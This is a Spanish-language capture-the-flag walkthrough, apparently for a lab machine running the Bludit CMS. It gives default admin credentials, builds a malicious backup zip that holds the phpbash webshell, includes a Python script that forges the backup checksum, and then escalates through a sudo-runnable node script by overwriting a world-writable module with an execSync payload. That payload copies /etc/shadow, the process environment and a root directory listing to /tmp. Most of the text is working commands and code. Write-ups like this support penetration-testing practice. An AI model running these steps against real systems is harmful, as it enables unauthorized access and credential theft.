@@ -1,1 +1,106 @@
+// Agregar la direccion IP a nuestro etc/hosts para que la pagina se muestre bien y no tenga errores
+echo "10.0.160.217 bludmoji.echocity-f.com" | sudo tee -a /etc/hosts
 
+// Credenciales de acceso a la plataforma de CMS
+-user: admin
+-password: admin1234
+
+// Habilitar el modulo de Backups
+Este es un paso muy primordial ya que este nos permitira aprovechar una vulnerabilidad en la cual subiremos un backup mailicioso para que tengamos uns shell interactiva 
+
+Paso 1. Para esto ya dentro del menu tenemos que ir al apartado de Plugins y ahi buscar el de Backups le damos el Activate y listo
+Paso 2. Luego que ya lo hayamos habilitado lo que sigue es descarganos un backup sano ya que no sera util 
+
+//Descargar phpbash
+Esta hay que descargar la herramienta de phpbash ya que nos sera de mucha utilidad y es el que hara la magia para darnos la shell
+
+// Modificar el backup 
+Ya dentro de la carpeta donde descargamos el backup haremos lo siguiente:
+unzip 2021-01-05-16-20-03.zip -d evil_backup
+
+2. Dentro de esa carpeta debe existir una ruta uploads/pages/. Copia ahí tu webshell (phpbash.php)
+cp phpbash.php evil_backup/uploads/pages/
+
+3. No veremos ninguna carpeta asi que harmemos lo siguiente:
+mkdir -p evil_backup/uploads/pages
+cp phpbash.php evil_backup/uploads/pages/ (en mi caso no funciono asi que copealo de forma manual y listo)
+
+//Quita el checksum viejo (el restore lo va a recalcular tú): 
+rm -f evil_backup/.BLUDIT_BACKUP
+// Recomprime desde dentro de evil_backup, para que el zip no tenga una carpeta extra evil_backup/ adentro:
+cd evil_backup
+python3 -c "import shutil; shutil.make_archive('../2026-09-07-19-53-01', 'zip', '.')"
+cd ..
+
+
+//Paso 3: checksum .BLUDIT_BACKUP
+Guarda esto como fix_checksum.py (en el mismo directorio que el zip):
+1. Usa el script Python:
+
+
+import zipfile
+import hashlib
+
+tmp = "2021-01-05-16-20-03.zip"
+
+# Elimina cualquier .BLUDIT_BACKUP existente
+with zipfile.ZipFile(tmp, 'r') as zin:
+    names = zin.namelist()
+    data = {name: zin.read(name) for name in names if name != '.BLUDIT_BACKUP'}
+
+with zipfile.ZipFile(tmp, 'w') as zout:
+    for name, content in data.items():
+        zout.writestr(name, content)
+
+# Calcula el MD5 del zip sin el checksum
+checksum = hashlib.md5(open(tmp, 'rb').read()).hexdigest()
+
+# Agrega el .BLUDIT_BACKUP con el checksum correcto
+with zipfile.ZipFile(tmp, 'a') as zapp:
+    zapp.writestr('.BLUDIT_BACKUP', checksum)
+
+print(f"Checksum: {checksum}")
+
+2. Ejecutamos
+python3 fix_checksum.py
+
+//Subir el archivo (backup) 
+1. Volvemos donde fue la parte de backup veremos un boton de subir backup seleccionamos nuestro backup.
+2. Una vez que ya se cargo le damos a nuestro backup RESTORE BACKUP y listo
+Dale click en "Restore backup" sobre el archivo que subiste. 
+Esto hace que Bludit valide el checksum (que ahora coincide) y extraiga el contenido del zip — incluyendo tu phpbash.php — directamente dentro de bl-content/uploads/pages/.
+
+// Acceder a la webshell
+http://10.0.160.217/bl-content/uploads/pages/phpbash.php
+http://bludmoji.echocity-f.com/bl-content/uploads/pages/phpbash.php
+
+// Escalacion
+1. Confirma el sudo
+Deberías ver algo como:
+(ALL) NOPASSWD: /usr/bin/node /app/bin/index.js
+2. Mira el script 
+cat /app/bin/index.js
+3. Permisos del modulo 
+ls -la /app/node_modules/emoji-poop/
+cat /app/node_modules/emoji-poop/index.js
+index.js debería ser -rwxrwxrwx (escribible por todos).
+
+4. Payload que vuelca las flags a /tmp (como root)
+Pega esta línea sola:
+printf '%s\n' 'const {execSync}=require("child_process"); execSync("id > /tmp/pwned; cat /etc/shadow > /tmp/shadow.txt; cat /proc/1/environ > /tmp/environ.txt; ls -la /root > /tmp/rootls.txt; chmod 644 /tmp/pwned /tmp/shadow.txt /tmp/environ.txt /tmp/rootls.txt"); module.exports="x";' > /app/node_modules/emoji-poop/index.js
+
+Comprobamos:
+cat /app/node_modules/emoji-poop/index.js
+Tiene que verse el execSync con /tmp/pwned, no el spawnSync.
+
+2. Dispara sudo (comando aparte)
+sudo /usr/bin/node /app/bin/index.js
+
+Puede imprimir x o quedarse un segundo. Luego:
+cat /tmp/pwned
+cat /tmp/shadow.txt
+cat /tmp/environ.txt
+cat /tmp/rootls.txt
+cat /etc/passwd
+
+LISTO GG EASY ZZZZZZZ
